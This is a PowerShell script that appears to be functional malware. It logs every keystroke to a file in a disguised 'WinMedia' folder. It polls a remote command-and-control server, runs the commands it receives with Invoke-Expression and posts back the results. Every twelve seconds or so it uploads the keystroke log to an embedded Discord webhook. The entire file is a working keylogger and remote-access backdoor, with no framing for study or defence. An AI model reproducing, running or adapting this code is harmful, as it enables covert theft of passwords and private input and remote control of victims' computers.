# 1. Core Target Variables
$PCName     = "chase"
$WebhookUrl = "https://discord.com/api/webhooks/1505177594226540655/BZPbc_W_oqVyfZEM0B5crFb3v3C03lgFeAU9DcdGrzUUCm_JbqsKoA8gIJMm4nlGDoxr"
$C2Url      = "https://chase-4ebb.onrender.com"
$dir        = "$env:LOCALAPPDATA\WinMedia"

if (!(Test-Path $dir)) { New-Item $dir -Type Directory | Out-Null }
$logFile = "$dir\data.txt"

# 2. Stable Native Compilation Window
$Source = @'
using System;
using System.Runtime.InteropServices;
public class KeyEngine {
    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int v);
}
'@
Add-Type -TypeDefinition $Source -ErrorAction SilentlyContinue

$c2Interval = 0
$discordInterval = 0
$headers = @{ "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" }

while ($true) {
    # ================= ENGINE A: HIGH-SPEED CHAR-MAPPED KEYLOGGER =================
    # Query direct keyboard line states simultaneously before stepping through individual loops
    $isShift = (([KeyEngine]::GetAsyncKeyState(16) -band 0x8000) -or ([KeyEngine]::GetAsyncKeyState(160) -band 0x8000) -or ([KeyEngine]::GetAsyncKeyState(161) -band 0x8000))
    $isCtrl  = (([KeyEngine]::GetAsyncKeyState(17) -band 0x8000) -or ([KeyEngine]::GetAsyncKeyState(162) -band 0x8000))
    $isCaps  = ([KeyEngine]::GetAsyncKeyState(20) -band 0x1)

    for ($i = 8; $i -le 190; $i++) {
        if ([KeyEngine]::GetAsyncKeyState($i) -eq -32767) {
            $keyText = ""

            # Explicit hotkey intercept loops
            if ($isCtrl -and $i -ne 17) {
                if ($i -ge 65 -and $i -le 90) { $keyText = " [CTRL+" + [char]$i + "] " }
                else { $keyText = " [CTRL+$i] " }
                try { $keyText | Out-File $logFile -Append -NoNewline -ErrorAction SilentlyContinue } catch {}
                continue
            }

            switch ($i) {
                8   { $keyText = " [BACKSPACE] " }
                9   { $keyText = " [TAB] " }
                13  { $keyText = "`n" }
                16  { continue } # Skip standard layout modifier logging
                17  { continue }
                18  { $keyText = " [ALT] " }
                20  { $keyText = " [CAPS] " }
                27  { $keyText = " [ESC] " }
                32  { $keyText = " " }
                46  { $keyText = " [DEL] " }
                
                # Direct English Letter Mapping (Bypasses ToUnicode limitations)
                { $_ -ge 65 -and $_ -le 90 } {
                    $letter = [char]$i
                    # Determine true state based on Shift and Caps Lock interaction
                    if ($isShift -xor $isCaps) { $keyText = $letter.ToString().ToUpper() }
                    else { $keyText = $letter.ToString().ToLower() }
                }

                # Direct Standard Number Line & Shifted Symbol Array Maps
                48  { $keyText = if ($isShift) { ")" } else { "0" } }
                49  { $keyText = if ($isShift) { "!" } else { "1" } }
                50  { $keyText = if ($isShift) { "@" } else { "2" } }
                51  { $keyText = if ($isShift) { "#" } else { "3" } }
                52  { $keyText = if ($isShift) { "$" } else { "4" } }
                53  { $keyText = if ($isShift) { "%" } else { "5" } }
                54  { $keyText = if ($isShift) { "^" } else { "6" } }
                55  { $keyText = if ($isShift) { "&" } else { "7" } }
                56  { $keyText = if ($isShift) { "*" } else { "8" } }
                57  { $keyText = if ($isShift) { "(" } else { "9" } }

                # Punctuation Mapping Matrix
                186 { $keyText = if ($isShift) { ":" } else { ";" } }
                187 { $keyText = if ($isShift) { "+" } else { "=" } }
                188 { $keyText = if ($isShift) { "<" } else { "," } }
                189 { $keyText = if ($isShift) { "_" } else { "-" } }
                190 { $keyText = if ($isShift) { ">" } else { "." } }
            }

            if ($keyText -ne "") {
                try { $keyText | Out-File $logFile -Append -NoNewline -ErrorAction SilentlyContinue } catch {}
            }
        }
    }

    # ================= ENGINE B: REMOTE COMMAND REMOTE AGENT POLLING =================
    if ($c2Interval -ge 1000) {
        try {
            $cmdResponse = Invoke-RestMethod -Uri "${C2Url}/get_cmd?id=${PCName}" -Method Get -Headers $headers -TimeoutSec 5
            if ($cmdResponse -and $cmdResponse -ne 'wait') {
                $output = (Invoke-Expression $cmdResponse 2>&1 | Out-String)
                if (!$output) { $output = 'Command executed with no return data.' }
                
                $postUrl = "${C2Url}/send_res?id=${PCName}"
                Invoke-RestMethod -Uri $postUrl -Method Post -Body $output -ContentType "text/plain" -Headers $headers -TimeoutSec 5 | Out-Null
            }
        } catch {}
        $c2Interval = 0
    }

    # ================= ENGINE C: DISCORD EXFILTRATION CHANNEL =================
    if ($discordInterval -ge 12000) {
        if (Test-Path $logFile) {
            if ((Get-Item $logFile).Length -gt 0) {
                try {
                    $timestamp = Get-Date -Format 'yyyy-MM-dd_HH-mm-ss'
                    $fileName = "${PCName}_${timestamp}.txt"
                    Invoke-RestMethod -Uri $WebhookUrl -Method Post -Form @{ file = Get-Item $logFile; filename = $fileName } -TimeoutSec 10 | Out-Null
                    Clear-Content $logFile -ErrorAction SilentlyContinue
                } catch {}
            }
        }
        $discordInterval = 0
    }

    # Blazing-fast 2ms loop sleep time captures typing at any speed flawlessly
    Start-Sleep -m 2
    $c2Interval += 2
    $discordInterval += 2
}
